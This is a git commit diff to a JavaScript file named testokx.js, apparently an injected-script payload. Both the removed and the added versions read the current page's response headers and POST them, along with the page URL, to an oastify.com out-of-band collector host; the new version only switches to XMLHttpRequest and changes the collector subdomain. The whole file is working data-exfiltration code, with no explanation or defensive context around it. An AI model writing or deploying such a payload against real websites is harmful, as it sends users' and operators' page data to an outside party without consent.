198d0c6e0259a6186045b9b5f2fc2dede89ae64d
naysser <77415898+naysser@users.noreply.github.com>
2024-05-18 16:16:49 +0100

    Update testokx.js

--- testokx.js
+++ testokx.js
@@ -1,23 +1,28 @@
 (function() {
-    var headers = new Headers();
-    var init = { method: 'GET', headers: headers, mode: 'cors', cache: 'default' };
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', window.location.href, true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+            var headers = xhr.getAllResponseHeaders();
+            var headersList = headers.split('\r\n').reduce(function(acc, current) {
+                var parts = current.split(': ');
+                if (parts.length === 2) {
+                    acc[parts[0]] = parts[1];
+                }
+                return acc;
+            }, {});
 
-    fetch(window.location.href, init).then(function(response) {
-        var headersList = '';
-        for (var pair of response.headers.entries()) {
-            headersList += pair[0] + ': ' + pair[1] + '\n';
+            fetch('https://wiipwopcfbhn6lszs7ws4aiz6qch0cu0j.oastify.com/collect-headers', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    url: window.location.href,
+                    headers: headersList
+                })
+            });
         }
-
-        // Send the headers to your server
-        fetch('https://pjcixhq5g4ig7etst0xl53js7jda14ysn.oastify.com/collect-headers', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                url: window.location.href,
-                headers: headersList
-            })
-        });
-    });
+    };
+    xhr.send();
 })();
